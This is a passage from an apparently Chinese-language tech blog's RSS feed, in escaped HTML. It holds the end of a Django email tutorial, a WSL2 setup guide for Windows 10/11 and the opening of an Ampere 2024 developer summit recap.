&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;EMAIL_USE_TLS&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;EMAIL_HOST_USER&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;EMAIL_HOST_USER&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;EMAIL_HOST_PASSWORD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;EMAIL_HOST_PASSWORD&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;设置gmail-smtp&#34;&gt;设置Gmail SMTP
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;启用Google账户的两步验证&lt;/li&gt;
&lt;li&gt;生成16位应用专用密码&lt;/li&gt;
&lt;li&gt;在.env文件中配置：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EMAIL_HOST=smtp.gmail.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EMAIL_HOST_USER=your@gmail.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EMAIL_HOST_PASSWORD=your_app_password
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;发送测试邮件&#34;&gt;发送测试邮件
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;django.core.mail&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;send_mail&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;send_mail&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;测试主题&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;邮件内容&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;&amp;#39;from@example.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;to@example.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;构建联系表单&#34;&gt;构建联系表单
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;创建ContactForm类处理表单数据&lt;/li&gt;
&lt;li&gt;实现get_info()方法格式化消息&lt;/li&gt;
&lt;li&gt;添加send()方法发送邮件&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;异步邮件发送django-4x&#34;&gt;异步邮件发送(Django 4.x+)
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;send_async_email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;send_mail&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;异步测试&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;这是通过Django 4.x异步发送的邮件&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EMAIL_HOST_USER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RECIPIENT_ADDRESS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;最佳实践&#34;&gt;最佳实践
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;将邮件逻辑封装为可重用服务&lt;/li&gt;
&lt;li&gt;编写单元测试验证邮件功能&lt;/li&gt;
&lt;li&gt;发送HTML格式邮件&lt;/li&gt;
&lt;li&gt;生产环境使用专业邮件服务(SendGrid/Mailgun)&lt;/li&gt;
&lt;li&gt;实现邮件验证功能&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;常见问题解答&#34;&gt;常见问题解答
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Q：如何在Django中测试邮件发送？&lt;/strong&gt;
A：开发阶段可使用控制台后端：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;EMAIL_BACKEND&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;django.core.mail.backends.console.EmailBackend&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Q：如何安全存储邮件凭证？&lt;/strong&gt;
A：使用django-environ从.env文件加载配置，切勿硬编码在源码中。&lt;/p&gt;
&lt;p&gt;完整代码示例可在&lt;a class=&#34;link&#34; href=&#34;https://github.com/example/django-email-tutorial&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub仓库&lt;/a&gt;获取。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>WSL2完全指南：Windows 10和11上的Linux开发环境配置</title>
        <link>http://localhost:1313/p/wsl2%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97windows-10%E5%92%8C11%E4%B8%8A%E7%9A%84linux%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
        <pubDate>Mon, 04 Aug 2025 07:58:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/wsl2%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97windows-10%E5%92%8C11%E4%B8%8A%E7%9A%84linux%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
        <description>&lt;h1 id=&#34;windows-subsystem-for-linux-2-wsl2-windows-10--11完全教程&#34;&gt;Windows Subsystem for Linux 2 (WSL2): Windows 10 &amp;amp; 11完全教程
&lt;/h1&gt;&lt;h2 id=&#34;核心要点&#34;&gt;核心要点
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;WSL2实现Windows与Linux环境无缝集成，支持同时使用Linux应用和Windows资源&lt;/li&gt;
&lt;li&gt;Windows 11的WSL2安装流程比Windows 10更简化，后者需手动启用虚拟机功能&lt;/li&gt;
&lt;li&gt;可直接在WSL2中运行Linux GUI应用，无需额外X服务器软件&lt;/li&gt;
&lt;li&gt;Docker在WSL2中运行效率更高，启动更快且无需专用Hyper-V&lt;/li&gt;
&lt;li&gt;通过挂载和符号链接实现Windows与Linux文件互访&lt;/li&gt;
&lt;li&gt;VS Code与WSL2深度集成，可直接访问Linux文件和终端&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;为什么使用linux&#34;&gt;为什么使用Linux？
&lt;/h2&gt;&lt;p&gt;Web服务器普遍采用Linux系统，它运行着包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器（Apache、NGINX等）&lt;/li&gt;
&lt;li&gt;语言环境（PHP、Python、Node.js等）&lt;/li&gt;
&lt;li&gt;工具库（图像处理、压缩工具等）&lt;/li&gt;
&lt;li&gt;数据库（MySQL、MongoDB等）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;wsl2安装配置&#34;&gt;WSL2安装配置
&lt;/h2&gt;&lt;h3 id=&#34;系统要求&#34;&gt;系统要求
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;需启用BIOS中的硬件虚拟化支持（VT-x/SVM）&lt;/li&gt;
&lt;li&gt;Windows 10需2004版本以上&lt;/li&gt;
&lt;li&gt;C盘至少1GB可用空间&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;安装步骤&#34;&gt;安装步骤
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;启用WSL功能（PowerShell管理员模式）：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;dism&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;online&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;enable-feature&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;featurename&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Microsoft-Windows&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-Subsystem-Linux&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;all&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;norestart&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;dism&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;online&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;enable-feature&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;featurename&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualMachinePlatform&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;all&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;norestart&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;设置WSL2为默认版本：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;wsl&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-set-default-version&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;安装Linux发行版（如Ubuntu）：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;wsl&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-install&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-d&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Ubuntu&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;高级功能&#34;&gt;高级功能
&lt;/h2&gt;&lt;h3 id=&#34;文件系统互通&#34;&gt;文件系统互通
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Windows访问Linux文件：&lt;code&gt;\\wsl$\Ubuntu\home\&amp;lt;用户名&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Linux访问Windows文件：&lt;code&gt;/mnt/c/Users/&amp;lt;用户名&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;docker集成&#34;&gt;Docker集成
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;安装Docker Desktop for Windows&lt;/li&gt;
&lt;li&gt;在设置中启用WSL2引擎&lt;/li&gt;
&lt;li&gt;通过WSL2直接运行docker命令&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;vs-code集成&#34;&gt;VS Code集成
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;安装&amp;quot;Remote - WSL&amp;quot;扩展&lt;/li&gt;
&lt;li&gt;在Linux终端中执行：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;code .
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;即可在Windows中直接编辑Linux文件&lt;/p&gt;
&lt;h2 id=&#34;图形界面应用&#34;&gt;图形界面应用
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;安装对应GPU驱动（Intel/AMD/NVIDIA）&lt;/li&gt;
&lt;li&gt;通过apt安装图形应用（如Gedit）：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install gedit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;直接执行&lt;code&gt;gedit&lt;/code&gt;启动应用&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;常见问题解答&#34;&gt;常见问题解答
&lt;/h2&gt;&lt;h3 id=&#34;wsl1与wsl2区别&#34;&gt;WSL1与WSL2区别
&lt;/h3&gt;&lt;p&gt;WSL2采用完整Linux内核虚拟机，性能提升20倍，兼容性更好&lt;/p&gt;
&lt;h3 id=&#34;多发行版管理&#34;&gt;多发行版管理
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;列出所有发行版：&lt;code&gt;wsl --list&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;设置默认发行版：&lt;code&gt;wsl --setdefault Ubuntu&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;切换发行版：&lt;code&gt;wsl -d Debian&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;端口访问&#34;&gt;端口访问
&lt;/h3&gt;&lt;p&gt;所有服务都通过localhost访问，注意端口冲突问题&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;通过WSL2，开发者可以同时获得Windows的易用性和Linux的强大功能，构建高效的跨平台开发环境。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Ampere 2024开发者峰会视频回顾：云原生处理器与架构迁移实战</title>
        <link>http://localhost:1313/p/ampere-2024%E5%BC%80%E5%8F%91%E8%80%85%E5%B3%B0%E4%BC%9A%E8%A7%86%E9%A2%91%E5%9B%9E%E9%A1%BE%E4%BA%91%E5%8E%9F%E7%94%9F%E5%A4%84%E7%90%86%E5%99%A8%E4%B8%8E%E6%9E%B6%E6%9E%84%E8%BF%81%E7%A7%BB%E5%AE%9E%E6%88%98/</link>
        <pubDate>Mon, 04 Aug 2025 07:46:53 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ampere-2024%E5%BC%80%E5%8F%91%E8%80%85%E5%B3%B0%E4%BC%9A%E8%A7%86%E9%A2%91%E5%9B%9E%E9%A1%BE%E4%BA%91%E5%8E%9F%E7%94%9F%E5%A4%84%E7%90%86%E5%99%A8%E4%B8%8E%E6%9E%B6%E6%9E%84%E8%BF%81%E7%A7%BB%E5%AE%9E%E6%88%98/</guid>
        <description>&lt;h3 id=&#34;峰会概览&#34;&gt;峰会概览
&lt;/h3&gt;&lt;p&gt;Uber云基础设施工程师Vikrant Soman的发言道出峰会主旨：&amp;ldquo;Ampere CPU的主机性能足以提供与现有方案相当或更高的吞吐量，请勿轻信基准测试，务必运行自身工作负载进行总成本分析。&amp;ldquo;这场于2024年9月26日举办的半日虚拟峰会，聚集了全球开发者共同探讨云架构迁移与Ampere®云原生处理器如何重塑计算未来。&lt;/p&gt;
&lt;h3 id=&#34;核心技术议程&#34;&gt;核心技术议程
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;混合架构构建的挑战与机遇&lt;/strong&gt;&lt;br&gt;
Ampere公司Pete Baker的主题演讲揭示了使用Ampere平台迁移时优化工具与方法的关键见解。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;云原生处理器的三重优势&lt;/strong&gt;&lt;br&gt;
首席技术推广官Sean Varley联合Fermyon的Kate Goldenring与ScyllaDB CEO Dor Laor，论证了Ampere高核心密度处理器对Kubernetes及分布式数据库等现代应用的适配性：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;蔡司公司通过转向WebAssembly并增加Ampere Arm节点，在保持性能同时实现60%成本削减&amp;rdquo; —— Kate Goldenring&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;最佳工作负载匹配实践&lt;/strong&gt;&lt;br&gt;
Ampere客户工程副总裁Naren Nayak与Uber/Oracle专家共同解析AI、无状态云负载等场景的性能增益：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;Arm生态已与x86指令集并肩发展&amp;rdquo; —— Vikrant Soman&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;AI推理成本优化方案&lt;/strong&gt;&lt;br&gt;
Oracle产品经理Amar Gowda与Wallaroo.AI团队展示：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;在OCI A1机器上部署量化模型，推理速度达x.86方案两倍&amp;rdquo; —— Steve Notley&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;混合架构迁移实战&lt;/strong&gt;&lt;br&gt;
Uber工程师Andreas Winther Lykke分享：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;3000个服务在数周内完成架构迁移与问题修复&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
